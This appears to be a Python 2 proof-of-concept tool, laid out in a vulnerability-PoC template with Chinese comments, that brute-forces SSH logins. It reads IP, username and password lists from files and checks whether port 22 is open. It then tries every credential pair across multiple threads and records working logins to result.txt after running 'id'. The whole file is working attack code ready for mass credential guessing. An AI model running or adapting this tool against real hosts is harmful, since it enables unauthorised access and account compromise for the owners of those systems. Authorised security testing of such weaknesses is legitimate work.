#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import paramiko
import threading
import optparse


maxConnections = 10
connection_lock = threading.BoundedSemaphore(value=maxConnections)

class SSHPOC(threading.Thread):
    vulID = '1'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    vulDate = '2018-06-23'  # 漏洞公开的时间,不知道就写今天

    author = 'fanyingjie'  # PoC作者的大名
    createDate = '2018-06-23'  # 编写 PoC 的日期
    updateDate = '2018-06-23'  # PoC 更新的时间,默认和编写时间一样
    references = ""
    name = 'ssh Unauthorized access'  # PoC 名称
    appPowerLink = 'http://www.openssh.com/'  # 漏洞厂商主页地址
    appName = 'ssh'  # 漏洞应用名称
    appVersion = 'all versions'  # 漏洞影响版本
    vulType = 'Weak-Password'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''ssh 存在弱口令'''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重"  # 严重,高危,中危,低危


    def __init__(self,ip,userlist,passlist,connection_lock):
        threading.Thread.__init__(self)
        self.connection_lock=connection_lock
        self.ip=ip
        self.userlist=userlist
        self.passlist=passlist

    #爆破模块
    def run(self):
        #判断22端口是否开放
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(5)

        try:
            sk.connect((self.ip, 22))
        except Exception:
            print "[-] %s 22端口关闭"%(self.ip)
            self.connection_lock.release()
            return ""
        sk.close()

        #开始爆破
        for u in self.userlist:
            for p in self.passlist:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(hostname=self.ip, port=22, username=u, password=p, timeout=5, allow_agent=False,
                                look_for_keys=False)
                    stdin, stdout, stderr = ssh.exec_command('id',timeout=1)
                    id = stdout.read()
                    success="ip:%s  username:%s  password:%s \n"%(self.ip,u,p)
                    f=open("result.txt",'a')
                    f.write(success)
                    f.close()
                    ssh.close()
                    print "[+] %s %s %s success" % (self.ip, u, p)
                    self.connection_lock.release()
                    return ""
                except Exception, ex:
                    ssh.close()
                    print "[-] %s %s %s error"%(self.ip,u,p)
        self.connection_lock.release()

#读取ip、user、pass返回一个列表
def readFile(filename):
    f=open(filename,'r')
    result=[]
    for line in f.readlines():
        result.append(line.strip("\n").strip())
    f.close()
    return result
def main():
    parse=optparse.OptionParser("Usage %prog -ip <ip file> -u <uesr file> -p <pass file> ")
    parse.add_option('-i',dest="ipfile",type="string",help="ip list filename")
    parse.add_option('-u', dest="userfile", type="string", help="user list filename")
    parse.add_option('-p', dest="passfile", type="string", help="pass list filename")
    parse.add_option('-t', dest="threadcount", type="string", help="thread count")

    (options, args) = parse.parse_args()

    if(options.ipfile==None):
        ipfile = "ip.txt"
    else:
        ipfile = options.ipfile

    if (options.userfile == None):
        userfile = "user.txt"
    else:
        userfile = options.userfile

    if (options.passfile == None):
        passfile = "pass.txt"
    else:
        passfile = options.passfile

    if (options.threadcount== None):
        maxConnections = 10
    else:
        maxConnections = int(options.threadcount)

    connection_lock = threading.BoundedSemaphore(value=maxConnections)

    iplist=readFile(ipfile)
    userlist=readFile(userfile)
    passlist=readFile(passfile)
    for ip in iplist:
        a=SSHPOC(ip,userlist,passlist,connection_lock)
        connection_lock.acquire()
        a.start()

main()


